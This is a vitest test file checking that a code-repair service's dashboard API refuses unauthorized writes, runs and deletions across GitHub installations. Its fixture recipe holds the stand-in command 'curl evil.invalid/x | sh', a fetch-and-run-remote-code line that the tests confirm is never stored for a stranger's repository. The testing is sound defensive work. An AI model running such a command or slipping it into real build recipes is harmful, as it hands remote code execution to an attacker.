// Being signed in is not being allowed (9c).
//
// The write on this surface stores shell commands the engine later executes verbatim in
// a sandbox with a package registry reachable (ADR-0013). Locally that is safe because
// there is one operator on 127.0.0.1. Hosted on a public address, an unauthorized POST
// here is remote code execution on somebody else's runner — so every case below is a
// person who IS signed in, trying to reach a repository that is not theirs.
//
// The authorization answer comes from GitHub (`GET /user/installations`), which is why
// both halves are injected here: what is under test is the gate, not the API client.
//
// EVERY PATH IN THIS FILE MOVED IN 10i, and none of the questions did. The surface used to
// render HTML at `/repos`, `/runs`, `/runs/:id` and `/repos/:r/onboard`; those are gone and
// the same gates now sit on `/api/` routes, with an anonymous request answered 401 rather
// than redirected — because a client that asked for JSON and got a login page has been told
// "the API returned garbage".
//
// The parts of these tests that asserted on RENDERED COPY — what a page promises, the words
// a refusal uses — moved to `test/screens.test.tsx`, which renders the components. What is
// asserted here is what it always was: who may act, on what, and what is written when they
// may not.

import { describe, expect, it, vi } from 'vitest';
import type { Db } from '../src/store.js';
import type { Session } from '../src/auth.js';
import { dashboardRoutes } from '../src/routes.js';

const SESSION: Session = { id: 's', githubId: 1, login: 'divy97', avatarUrl: '', token: 'ghu' };

/** Answers the lookups the surface makes, and records every write. */
const fakeClient = (writes: string[] = []) =>
  ({
    // Params, not just SQL: `readRunRow` filters by `where run_id = $1`, and a fake that
    // ignores the parameter answers every lookup with the first row — which made a test
    // about seeing somebody else's run pass by handing back your own.
    query: vi.fn(async (sql: string, params?: unknown[]) => {
      writes.push(sql);
      const wanted = sql.includes('where run_id = $1') ? String(params?.[0] ?? '') : null;
      const rows =
        sql.includes('from installations')
          ? [
              { repo: 'mine/repo', installation_id: 1, account: 'me', connected_at: new Date(), removed_at: null },
              { repo: 'theirs/repo', installation_id: 2, account: 'them', connected_at: new Date(), removed_at: null },
            ]
          : sql.includes('from run_projection')
            ? [
                { run_id: MINE_RUN, repo: 'mine/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 7, thread_ref: 'mine/repo#1' },
                { run_id: THEIRS_RUN, repo: 'theirs/repo', issue_number: 1, status: 'pr_opened', started_at: new Date(), ended_at: null, tier: 2, score: 98, ceiling: 103, scoring: 2, reproduced: true, pr_number: 8, thread_ref: 'theirs/repo#1' },
              ].filter((row) => wanted === null || row.run_id === wanted)
            : [];
      return { rows, rowCount: rows.length };
    }),
  }) as unknown as Db;

/** A surface where this person can see installation 1 and nothing else. */
const surface = (
  options: {
    session?: Session | null;
    installations?: number[];
    writes?: string[];
    onDraftRequested?: (repo: string, by: number | null) => void;
  } = {},
) =>
  dashboardRoutes({
    client: fakeClient(options.writes),
    installUrl: 'https://example.invalid',
    ...(options.onDraftRequested ? { onDraftRequested: options.onDraftRequested } : {}),
    auth: {
      session: async () => (options.session === undefined ? SESSION : options.session),
      installations: async () => options.installations ?? [1],
    },
  });

const call = (
  route: ReturnType<typeof dashboardRoutes>,
  method: string,
  path: string,
  body = '',
  headers: Record<string, string> = {},
) =>
  route({
    method,
    path,
    query: new URLSearchParams(),
    headers,
    body: async () => body,
    raw: async () => Buffer.from(body),
  });

/**
 * What a JSON write has to declare.
 *
 * `routes.ts` refuses a `/api/` write that does not, and that refusal is part of the CSRF
 * story rather than a formality — the one request shape a browser can send cross-site with
 * no preflight is exactly the one no JSON client sends. Every write below carries it, so
 * these tests fail on AUTHORIZATION rather than on the envelope.
 */
const JSON_POST = { 'content-type': 'application/json' };

/** A recipe a stranger would love to have stored: a command the engine runs verbatim. */
const RECIPE = JSON.stringify({ recipe: { install: 'curl evil.invalid/x | sh', services: [] } });

/** Real uuids, because `run_projection.run_id` is a `uuid` column and a route now says so. */
const MINE_RUN = '3f1c9a52-7b0e-4d2f-9c41-8a6e5d0b21c7';
const THEIRS_RUN = '9b2e7c14-5d38-4a6f-8e10-2c9f4b7a3d55';

describe('a stranger is told, on every route', () => {
  it.each([
    ['/api/repos'],
    ['/api/runs'],
    [`/api/runs/${MINE_RUN}/evidence`],
    [`/api/runs/${MINE_RUN}/events`],
    ['/api/repos/mine%2Frepo'],
    ['/api/repos/mine%2Frepo/recipe'],
    ['/api/repos/mine%2Frepo/runners'],
    ['/api/repos/mine%2Frepo/secrets'],
  ])('anonymous %s is 401, not a redirect and not data', async (path) => {
    // 401 rather than the 302 these gave while they were pages. A redirect to an HTML login
    // is a 200 full of markup as far as a client is concerned, and that is how "not signed
    // in" becomes "the API returned garbage" — the reason `anonymous()` branches on the
    // path. Enumerated one by one rather than looped over a list built from the router,
    // because a route added without a gate is exactly what this is for.
    const response = await call(surface({ session: null }), 'GET', path);
    expect(response?.status, path).toBe(401);
    expect(String(response?.body), path).not.toContain('mine/repo');
  });

  it('an anonymous API request is told plainly, not redirected', async () => {
    // A redirect to an HTML login page is a 200 full of markup as far as a client is
    // concerned, and that is how "not signed in" becomes "the API returned garbage".
    const response = await call(surface({ session: null }), 'GET', '/api/runs');
    expect(response?.status).toBe(401);
  });

  it('an anonymous approval stores nothing', async () => {
    const writes: string[] = [];
    const response = await call(surface({ session: null, writes }), 'PUT', '/api/repos/mine%2Frepo/recipe', RECIPE, JSON_POST);
    expect(response?.status).toBe(401);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
  });

  it('an anonymous request for a draft starts nothing', async () => {
    // `POST …/draft` (10n) stores nothing itself, which is exactly why it is easy to file
    // under "reads". It starts a container that clones somebody's code and spends a model
    // key, so it is gated like every other write here.
    const asked: string[] = [];
    const response = await call(
      surface({ session: null, onDraftRequested: (repo: string) => asked.push(repo) }),
      'POST',
      '/api/repos/mine%2Frepo/draft',
      '',
      JSON_POST,
    );
    expect(response?.status).toBe(401);
    expect(asked).toEqual([]);
  });
});

describe('being signed in is not being allowed', () => {
  it('THE test: approving for a repository you cannot see stores nothing', async () => {
    // Signed in, valid session, correct origin — and installation 2 is not theirs. If
    // this passes, the recipe is stored and the next run on that repository executes
    // `curl evil.invalid/x | sh` on somebody else's machine.
    const writes: string[] = [];
    const response = await call(surface({ writes }), 'PUT', '/api/repos/theirs%2Frepo/recipe', RECIPE, JSON_POST);

    expect(response?.status).toBe(404);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
  });

  it('asking for a draft on a repository you cannot see starts nothing', async () => {
    // The same shape as the approval test above and for the same reason: installation 2 is
    // not theirs. A pass here means a stranger can make this engine clone a private
    // repository they cannot see and bill somebody else's key for reading it.
    const asked: string[] = [];
    const response = await call(
      surface({ onDraftRequested: (repo: string) => asked.push(repo) }),
      'POST',
      '/api/repos/theirs%2Frepo/draft',
      '',
      JSON_POST,
    );
    expect(response?.status).toBe(404);
    expect(asked).toEqual([]);
  });

  it('and asking for one you CAN see starts it, with the asker attached', async () => {
    // The control, plus the point of the route: `by` is what makes the worker bill the
    // person who asked. Without it `/model-key` answers null and the operator pays, which
    // is what installing the App used to do for every repository it could see.
    const asked: { repo: string; by: number }[] = [];
    const response = await call(
      surface({ onDraftRequested: (repo: string, by: number | null) => asked.push({ repo, by: by ?? -1 }) }),
      'POST',
      '/api/repos/mine%2Frepo/draft',
      '',
      JSON_POST,
    );
    expect(response?.status).toBe(202);
    expect(asked).toHaveLength(1);
    expect(asked[0]!.repo).toBe('mine/repo');
    expect(asked[0]!.by).toBeGreaterThan(0);
  });

  it('and approving for one you CAN see is stored, so the refusal is not blanket', async () => {
    // The control. Without it the test above passes on a surface that refuses
    // everything, which is a working authorization check and a broken product.
    const writes: string[] = [];
    const response = await call(surface({ writes }), 'PUT', '/api/repos/mine%2Frepo/recipe', RECIPE, JSON_POST);

    expect(response?.status).toBe(200);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
  });

  it('a repository you cannot see is not found, in the same words an unknown one gets', async () => {
    const theirs = await call(surface(), 'GET', '/api/repos/theirs%2Frepo');
    const nobodys = await call(surface(), 'GET', '/api/repos/nobody%2Frepo');
    expect(theirs?.status).toBe(404);
    // Identical answers. A stranger probing names learns nothing about which repositories
    // this service knows.
    expect(String(theirs?.body)).toBe(String(nobodys?.body));
    expect(String(theirs?.body)).toContain('not connected');
  });

  it('the repository list carries theirs and not the other one', async () => {
    const response = await call(surface(), 'GET', '/api/repos');
    const rows = JSON.parse(String(response?.body)) as { repo: string }[];
    expect(rows.map((row) => row.repo)).toEqual(['mine/repo']);
  });

  it.each([['evidence'], ['events']])(
    'a run belonging to another installation is not found (%s)',
    async (leaf) => {
      const response = await call(surface(), 'GET', `/api/runs/${THEIRS_RUN}/${leaf}`);
      expect(response?.status).toBe(404);
      // And it carries none of that run's data on the way out.
      expect(String(response?.body)).not.toContain('theirs/repo');
    },
  );

  it('and the run list carries only what they may see', async () => {
    const response = await call(surface(), 'GET', '/api/runs');
    const rows = JSON.parse(String(response?.body)) as { repo: string }[];
    expect(rows.map((row) => row.repo)).toEqual(['mine/repo']);
  });

  it('deleting the evidence of a run you cannot see deletes nothing', async () => {
    // 9e's write. Destroying somebody's evidence is not a lesser thing to be allowed to
    // do than reading it, so it goes through the same gate as the run's own page.
    const writes: string[] = [];
    const route = dashboardRoutes({
      client: fakeClient(writes),
      installUrl: 'https://example.invalid',
      blobRoot: '/tmp/never-used-because-this-is-refused',
      auth: { session: async () => SESSION, installations: async () => [1] },
    });
    const response = await call(route, 'POST', `/api/runs/${THEIRS_RUN}/forget`, '', JSON_POST);

    expect(response?.status).toBe(404);
    expect(writes.some((sql) => sql.includes('insert into forgotten'))).toBe(false);
  });

  it('revoking a runner by id does not reach another installation s machine', async () => {
    // The IDOR this closes: the gate authorized `mine/repo` in the path and the runner
    // id came from the URL unchecked, so a valid session on any repository could revoke
    // any machine whose id it knew. The fake below records the SQL, and the assertion is
    // that the update is scoped rather than that it happened.
    const writes: string[] = [];
    const response = await call(
      surface({ writes }),
      'POST',
      '/api/repos/mine%2Frepo/runners/somebody-elses-id/revoke',
      '',
      JSON_POST,
    );

    // Nothing matched, so nothing was revoked, and the answer is the one a runner that
    // does not exist gets.
    expect(response?.status).toBe(404);
    const revokes = writes.filter((sql) => sql.includes('set revoked_at'));
    expect(revokes).toHaveLength(1);
    // SCOPED — the update names the installation as well as the id. Matched loosely
    // because this fake can only read SQL text, and the exact predicate has already
    // changed once: 10e rewrote it to `is not distinct from` so a global worker, whose
    // installation is null, could be revoked at all. A test that pins the operator pins
    // the wrong thing.
    //
    // What the predicate DOES is proven behaviourally against a real database in
    // `plane.test.ts` — that a confined runner cannot be revoked by naming the wrong
    // installation, or none. This assertion's job is only that the clause is there.
    expect(revokes[0]).toMatch(/where id = \$1 and installation_id\b.*\$2/);
  });

  it('a GitHub that will not answer denies rather than admits', async () => {
    // `installationsFor` returns an empty list when GitHub is unreachable, and this is
    // what that means at the surface: an outage must not become an authorization.
    const writes: string[] = [];
    const response = await call(
      surface({ installations: [], writes }),
      'PUT',
      '/api/repos/mine%2Frepo/recipe',
      RECIPE,
      JSON_POST,
    );
    expect(response?.status).toBe(404);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(false);
  });
});

/**
 * Starting a run is a write, and gated like one (M10).
 *
 * `POST /api/runs` queues a job a worker will execute against a repository — clone,
 * install, run the recipe's commands. It is the webhook's old job behind a button, and
 * the button answers "may you" the way the approval does: before the installation is
 * looked up, and before GitHub is asked anything about the issue.
 */
describe('starting a run is a write, and gated like one', () => {
  const RECIPE_ROW = { recipe: { install: 'npm ci', services: [], test: 'npm test' } };

  /** Answers the lookups the trigger makes, and records every write WITH its params. */
  const triggerClient = (
    writes: { sql: string; params: unknown[] }[],
    options: { recipe?: boolean; open?: boolean; modelKey?: boolean } = {},
  ) =>
    ({
      query: vi.fn(async (sql: string, params: unknown[] = []) => {
        writes.push({ sql, params });
        const rows = sql.includes('from installations')
          ? [
              { repo: 'mine/repo', installation_id: 1, account: 'me', connected_at: new Date(), removed_at: null },
              { repo: 'theirs/repo', installation_id: 2, account: 'them', connected_at: new Date(), removed_at: null },
            ].filter((row) => !sql.includes('where repo = $1') || row.repo === params[0])
          : sql.includes('from recipes')
            ? (options.recipe ?? true)
              ? [RECIPE_ROW]
              : []
            : // Whoever presses Start pays for the run (M10), so the button asks whether
              // they have a key before it queues anything. Default present, because every
              // test in this file is about authorization and not about billing.
              sql.includes('from user_model_keys')
              ? (options.modelKey ?? true)
                ? [{ provider: 'openrouter' }]
                : []
              : sql.includes('from jobs')
                ? options.open
                  ? [{ run_id: 'already-running' }]
                  : []
                : [];
        return { rows, rowCount: rows.length };
      }),
    }) as unknown as Db;

  /**
   * GitHub as the picker and the button see it: one open issue, and one pull request.
   * `asked` records the token mint as well as every fetch, so "GitHub is never asked"
   * covers the credential and not only the call made with it.
   */
  const github = (asked: string[] = []) => ({
    // NOT shaped like a real credential. `ghs_…` is GitHub's prefix for an installation
    // token, and a secret scanner reads any literal wearing it as a leak — this repository's
    // first one failed on exactly that. A stand-in has to be unmistakably a stand-in.
    token: async () => {
      asked.push('token');
      return 'an-installation-token';
    },
    api: 'http://github.invalid',
    fetch: (async (input: string | URL | Request) => {
      const url = String(input instanceof Request ? input.url : input);
      asked.push(url);
      const path = new URL(url).pathname;
      const issue = {
        number: 41,
        title: 'The orders page title is misspelled',
        body: 'It says "Ordres".',
        html_url: 'https://github.com/mine/repo/issues/41',
        labels: [{ name: 'bug' }],
        updated_at: '2026-09-01T00:00:00Z',
      };
      // Every pull request is an issue to this endpoint, with one extra key.
      const pull = { ...issue, number: 42, title: 'Fix the title', pull_request: { url: 'x' } };
      if (path === '/repos/mine/repo/issues') return Response.json([issue, pull]);
      if (path === '/repos/mine/repo/issues/41') return Response.json(issue);
      if (path === '/repos/mine/repo/issues/42') return Response.json(pull);
      return new Response('not found', { status: 404 });
    }) as typeof fetch,
  });

  const trigger = (
    writes: { sql: string; params: unknown[] }[],
    options: {
      recipe?: boolean;
      open?: boolean;
      modelKey?: boolean;
      asked?: string[];
      session?: Session | null;
      app?: boolean;
    } = {},
  ) =>
    dashboardRoutes({
      client: triggerClient(writes, options),
      installUrl: 'https://example.invalid',
      auth: {
        session: async () => (options.session === undefined ? SESSION : options.session),
        installations: async () => [1],
      },
      ...(options.app === false ? {} : { github: github(options.asked) }),
    });

  const start = (route: ReturnType<typeof dashboardRoutes>, repo: string, issue = 41, type = 'application/json') =>
    call(route, 'POST', '/api/runs', JSON.stringify({ repo, issue_number: issue }), { 'content-type': type });

  const queued = (writes: { sql: string; params: unknown[] }[]) => writes.filter((w) => w.sql.includes('insert into jobs'));

  it('THE test: starting a run on a repository you cannot see queues nothing, and GitHub is never asked', async () => {
    // Signed in, valid session, a body a real page would send — and installation 2 is not
    // theirs. If this passes, a worker clones somebody else's repository and runs its
    // recipe on the strength of a session that was never allowed to see it.
    const writes: { sql: string; params: unknown[] }[] = [];
    const asked: string[] = [];
    const response = await start(trigger(writes, { asked }), 'theirs/repo');

    expect(response?.status).toBe(404);
    expect(queued(writes)).toHaveLength(0);
    // Before the issue is fetched, not after: an unauthorized request must not spend an
    // installation token reading a stranger's issue on its way to being refused.
    expect(asked).toHaveLength(0);
  });

  it('and starting one on a repository you CAN see is queued, so the refusal is not blanket', async () => {
    // The control. Without it the test above passes on a button that refuses everyone.
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes), 'mine/repo');

    expect(response?.status).toBe(202);
    const { run_id } = JSON.parse(String(response?.body)) as { run_id: string };
    expect(run_id).toMatch(/^[0-9a-f-]{36}$/);

    const [job] = queued(writes);
    expect(job).toBeDefined();
    // Who pressed the button and on what, as columns; and the same fact inside the intake
    // the worker will write as `RUN_REQUESTED`, so the log says it too.
    expect(job!.params[4]).toBe(SESSION.githubId);
    expect(job!.params[5]).toBe(41);
    const intake = JSON.parse(String(job!.params[3])) as { event: { thread_ref: string; requested_by?: string; source: string } };
    expect(intake.event.thread_ref).toBe('mine/repo#41');
    expect(intake.event.requested_by).toBe('divy97');
    // Still `github_issue`: that is where the report lives. Who asked is a second fact.
    expect(intake.event.source).toBe('github_issue');
  });

  it('an anonymous press is told plainly, and the picker likewise', async () => {
    const writes: { sql: string; params: unknown[] }[] = [];
    expect((await start(trigger(writes, { session: null }), 'mine/repo'))?.status).toBe(401);
    expect((await call(trigger(writes, { session: null }), 'GET', '/api/repos/mine%2Frepo/issues'))?.status).toBe(401);
    expect(queued(writes)).toHaveLength(0);
  });

  it('the new verbs do not become a second door onto the recipe write', async () => {
    // Widening the router's method allowlist for the secrets routes (M10) put `PUT` and
    // `DELETE` in front of every block that has no method check of its own — and the
    // onboarding block had none, so a `PUT /repos/:repo/onboard` fell into "THE ONE
    // WRITE" and stored shell commands the engine executes verbatim. Not reachable
    // cross-site, and a second door onto the highest-privilege write in this surface.
    // The form route is gone with `src/web.ts`, and the write is a `PUT` with a JSON body —
    // so the question this test asks has inverted: it is no longer "does an unexpected verb
    // fall into the write" but "does an unexpected ENVELOPE". A form post is the one shape a
    // browser can send cross-site with no preflight, and it must not reach this write
    // whatever verb carries it.
    for (const method of ['POST', 'PUT'] as const) {
      const writes: { sql: string; params: unknown[] }[] = [];
      const response = await call(trigger(writes), method, '/api/repos/mine%2Frepo/recipe', RECIPE, {
        'content-type': 'application/x-www-form-urlencoded',
      });
      expect(response?.status, method).toBe(415);
      expect(writes.filter((w) => w.sql.includes('insert into recipes'))).toHaveLength(0);
    }
    // And the paths the write used to live at answer nothing at all, so the bundle serves
    // them — there is no second door left open behind the one that moved.
    for (const method of ['GET', 'POST', 'PUT', 'DELETE'] as const) {
      expect(await call(trigger([]), method, '/repos/mine%2Frepo/onboard', RECIPE, JSON_POST), method).toBeNull();
    }
    // THE positive control: the verb and envelope that ARE the write still work, so this is
    // not a surface that refuses everything.
    const writes: { sql: string; params: unknown[] }[] = [];
    const stored = await call(trigger(writes), 'PUT', '/api/repos/mine%2Frepo/recipe', RECIPE, JSON_POST);
    expect(stored?.status).toBe(200);
    expect(writes.filter((w) => w.sql.includes('insert into recipes'))).toHaveLength(1);
  });

  it('a repository with no recipe is answered, not run', async () => {
    // The onboarding gate the webhook path had (M6a), kept: a run against a repository
    // nobody has described would reproduce nothing and call that a finding.
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes, { recipe: false }), 'mine/repo');

    expect(response?.status).toBe(409);
    expect(JSON.parse(String(response?.body))).toMatchObject({ error: 'not onboarded' });
    expect(queued(writes)).toHaveLength(0);
  });

  it('a person with no model key is told so, before GitHub is asked anything', async () => {
    // A run spends the key of whoever pressed Start (M10). Without one the worker would
    // claim the job, fail to drive a model, and end the run `errored` — our configuration
    // problem wearing the shape of a finding about their bug. 412, and nothing queued.
    const writes: { sql: string; params: unknown[] }[] = [];
    const asked: string[] = [];
    const response = await start(trigger(writes, { modelKey: false, asked }), 'mine/repo');

    expect(response?.status).toBe(412);
    expect(JSON.parse(String(response?.body))).toMatchObject({ error: 'no model key' });
    expect(queued(writes)).toHaveLength(0);
    // And no installation token was spent reading an issue for a run that cannot start.
    expect(asked).toHaveLength(0);
  });

  it('a run already under way is not queued twice', async () => {
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes, { open: true }), 'mine/repo');

    expect(response?.status).toBe(409);
    expect(JSON.parse(String(response?.body))).toMatchObject({ run_id: 'already-running' });
    expect(queued(writes)).toHaveLength(0);
  });

  it('a pull request is not an issue, however it is numbered', async () => {
    // A run against a pull request is a run against a fix that already exists. The picker
    // never offers one; the button must not accept one typed in by hand either.
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes), 'mine/repo', 42);

    expect(response?.status).toBe(404);
    expect(queued(writes)).toHaveLength(0);
  });

  it('the picker lists what you may see, and drops pull requests', async () => {
    const asked: string[] = [];
    const mine = await call(trigger([], { asked }), 'GET', '/api/repos/mine%2Frepo/issues');
    expect(mine?.status).toBe(200);
    expect((JSON.parse(String(mine?.body)) as { number: number }[]).map((issue) => issue.number)).toEqual([41]);

    const theirs = await call(trigger([], { asked }), 'GET', '/api/repos/theirs%2Frepo/issues');
    expect(theirs?.status).toBe(404);
    // One token and one fetch for the list that was allowed; nothing for the other.
    expect(asked).toEqual(['token', expect.stringContaining('/repos/mine/repo/issues')]);
  });

  it('a body that is JSON but not an object is a 400, like every other bad body', async () => {
    // `null` parses. Reading `.repo` off it threw, and the server's catch made that a
    // 500 — the one malformed body that was answered differently from the rest.
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await call(trigger(writes), 'POST', '/api/runs', 'null', { 'content-type': 'application/json' });
    expect(response?.status).toBe(400);
    expect(queued(writes)).toHaveLength(0);
  });

  it('a form body is refused as the wrong kind, before anything is looked up', async () => {
    const writes: { sql: string; params: unknown[] }[] = [];
    const response = await start(trigger(writes), 'mine/repo', 41, 'application/x-www-form-urlencoded');

    expect(response?.status).toBe(415);
    expect(writes).toHaveLength(0);
  });

  it('a surface with no App says so, rather than listing nothing', async () => {
    const writes: { sql: string; params: unknown[] }[] = [];
    expect((await start(trigger(writes, { app: false }), 'mine/repo'))?.status).toBe(501);
    expect((await call(trigger(writes, { app: false }), 'GET', '/api/repos/mine%2Frepo/issues'))?.status).toBe(501);
    expect(queued(writes)).toHaveLength(0);
  });
});

describe('the local surface is unchanged', () => {
  it('with no auth configured, nothing is gated', async () => {
    // ADR-0013's original shape: one operator, 127.0.0.1, the origin check is the
    // control. `serve.ts` still runs exactly this, and 9c must not have quietly
    // required a GitHub login to use your own laptop.
    const writes: string[] = [];
    const local = dashboardRoutes({ client: fakeClient(writes), installUrl: 'https://example.invalid' });
    const response = await call(local, 'PUT', '/api/repos/theirs%2Frepo/recipe', RECIPE, JSON_POST);

    expect(response?.status).toBe(200);
    expect(writes.some((sql) => sql.includes('insert into recipes'))).toBe(true);
  });
});

/**
 * The front door, which for a while was the one page that never asked.
 *
 * Every other route here calls `visible(headers)` first. `/` did not — it rendered the
 * landing page for everyone and decided the sign-in link from `options.auth !== undefined`,
 * which answers "is login configured on this deployment", not "is this person logged
 * out". So a signed-in user who typed the bare hostname was shown a marketing page
 * offering them a sign-in they had already done, with no link to their own repositories.
 *
 * Nothing was broken underneath: the session was valid and `/repos` worked. The page
 * simply never looked, which is the kind of bug a test of the routes it DID gate cannot
 * find.
 */
describe('the landing page asks who you are', () => {
  it('a signed-in visitor is sent to their repositories, not offered a sign-in', async () => {
    const response = await call(surface(), 'GET', '/');

    expect(response?.status).toBe(302);
    expect(response?.headers?.location).toBe('/repos');
  });

  it('a signed-in visitor with no installations still goes to /repos, which is where the answer is', async () => {
    // Not a special case worth its own page: `/repos` is precisely the page that says
    // "you have not installed this anywhere yet".
    //
    // This input is also what a GitHub OUTAGE looks like — `installationsFor` answers `[]`
    // rather than throwing, deliberately, so that a failure to confirm access denies it
    // rather than granting it. Worth knowing that the front door behaves the same either
    // way, which it does because it never asks GitHub anything (see below).
    const response = await call(surface({ installations: [] }), 'GET', '/');

    expect(response?.status).toBe(302);
    expect(response?.headers?.location).toBe('/repos');
  });

  it('a signed-out visitor is not redirected — the bundle answers', async () => {
    // `null`, so `staticRoutes` serves the landing page. The route still EXISTS only for
    // the redirect above: the bundle could make the same decision from `/api/me`, but it
    // would paint the marketing page first and replace it, so every signed-in visitor to
    // the front door would see it flash past.
    //
    // Whether that page offers a way in is `test/screens.test.tsx`'s question now — it is a
    // property of the component, and it is asserted there in both directions.
    expect(await call(surface({ session: null }), 'GET', '/')).toBeNull();
  });

  it('and locally, where there is no login, the front door is the same', async () => {
    // One operator on 127.0.0.1. `auth` absent means `session()` is never called, so there
    // is nobody to redirect and the bundle answers — which then asks `/api/me`, is told
    // there are no accounts, and shows the application rather than a pitch.
    const local = dashboardRoutes({ client: fakeClient(), installUrl: 'https://example.invalid' });
    expect(await call(local, 'GET', '/')).toBeNull();
  });

  it('asks who you are without asking what you own', async () => {
    // The property the first version of this fix broke. Reaching for `visible()` here is
    // the obvious move — it is what every other route does — and it buys an authorization
    // answer this route never reads: a GitHub `GET /user/installations` and an
    // `installations` query, on the front door, which then redirects to a page that asks
    // both again. Two round-trips to render a page that used to do no I/O at all.
    //
    // So: a session lookup, and nothing else.
    const writes: string[] = [];
    await call(surface({ writes }), 'GET', '/');

    expect(writes.some((sql) => sql.includes('from installations'))).toBe(false);
  });
});

/**
 * The pairing command is a command people PASTE. It has to be true.
 *
 * It shipped saying `ENGINE_PLANE_URL=<this service>` — a literal placeholder, on a page
 * served from the host it should have been naming — and, worse, `npx tf-runner`. There is
 * no `tf-runner` package of ours and `bin` is empty; `tf-runner` is a real name on the npm
 * registry owned by somebody else. So the instruction printed next to a freshly minted
 * credential was "download a stranger's package and execute it, with this token already in
 * your environment".
 */
describe('the pairing answer names this service and nothing off the internet', () => {
  // The COMMAND moved to `test/screens.test.tsx` with the screen that prints it — `npm run
  // runner` rather than an `npx` of a package that is not ours, and the sentence about
  // shell history. What stays here is the part the server decides: the URL the machine has
  // to dial, which the page can only print because this route worked it out.
  const mint = (headers: Record<string, string> = {}) =>
    call(surface(), 'POST', '/api/repos/mine%2Frepo/runners', JSON.stringify({ name: 'laptop' }), {
      ...JSON_POST,
      ...headers,
    });

  const planeUrl = async (headers: Record<string, string> = {}) =>
    (JSON.parse(String((await mint(headers))?.body)) as { planeUrl: string }).planeUrl;

  it('prints the origin the operator is reading, not a placeholder', async () => {
    // This route once answered with the literal string `<this service>`, served from the
    // host it should have been naming.
    expect(await planeUrl({ host: 'plane.example.dev', 'x-forwarded-proto': 'https' })).toBe(
      'https://plane.example.dev',
    );
  });

  it('trusts x-forwarded-proto, because the plane speaks plain HTTP behind a terminator', async () => {
    // Trusting the socket would print `http://` for an `https://` deployment, and a runner
    // dialling that gets a redirect it does not follow.
    expect(await planeUrl({ host: 'plane.example.dev' })).toBe('https://plane.example.dev');
  });

  it('and stays http on a laptop, where there is no terminator and no certificate', async () => {
    expect(await planeUrl({ host: '127.0.0.1:8788' })).toBe('http://127.0.0.1:8788');
  });

  it('hands the token over exactly once, and never again', async () => {
    const minted = JSON.parse(String((await mint({ host: '127.0.0.1:8788' }))?.body)) as { token: string };
    expect(minted.token).toMatch(/\S/);
    const listed = await call(surface(), 'GET', '/api/repos/mine%2Frepo/runners');
    expect(String(listed?.body)).not.toContain(minted.token);
  });
});

/**
 * What the pages PROMISE has to match what the deployment can do.
 *
 * The hosted plane holds no model key and runs no containers (ADR-0011, ADR-0019): work
 * goes to a paired runner, and nothing drafts a recipe there. Yet the pages offered to
 * "draft a recipe" and said a run starts by labelling an issue — the last of three steps.
 * Someone following that labels an issue, the plane logs `not onboarded — nothing queued`,
 * and the screen says nothing at all. That is the failure mode this project exists to
 * refuse, in the UI rather than in a verdict.
 *
 * `mode` is explicit rather than inferred from whether login is configured, because those
 * are two different questions — the conflation the landing page already had once.
 */
/**
 * What a deployment may promise is still decided here, and said elsewhere.
 *
 * `mode` used to change the words on a rendered page — "draft a recipe" locally, "write a
 * recipe" on a plane that drafts nothing — and those assertions moved to
 * `test/screens.test.tsx` with the component that prints them. What did not move is the
 * decision: `mode` is a fact about the deployment, and `/api/me` is where the UI learns it.
 *
 * The default matters most. It is `plane`, the more restricted one, so a deployment that
 * forgot to say offers less than it can rather than promising drafting that will never
 * happen.
 */
describe('a deployment reports only what it can do', () => {
  const me = async (options: Parameters<typeof surface>[0] = {}) =>
    JSON.parse(String((await call(surface(options), 'GET', '/api/me'))?.body)) as {
      mode: string;
      accounts: boolean;
      signedIn: boolean;
      github: boolean;
      forgetting: boolean;
    };

  it('defaults to the restricted mode, so one that forgot to say promises less', async () => {
    expect((await me()).mode).toBe('plane');
  });

  it('says when there is no App, because the picker and Start both 501 without one', async () => {
    expect((await me()).github).toBe(false);
    const picker = await call(surface(), 'GET', '/api/repos/mine%2Frepo/issues');
    expect(picker?.status).toBe(501);
  });

  it('says when nothing here can destroy an artifact', async () => {
    // `forgetting` is false without a `blobRoot`, and the route agrees: 501 rather than a
    // pretended deletion.
    expect((await me()).forgetting).toBe(false);
    const forget = await call(surface(), 'POST', `/api/runs/${MINE_RUN}/forget`, '', JSON_POST);
    expect(forget?.status).toBe(501);
  });
});
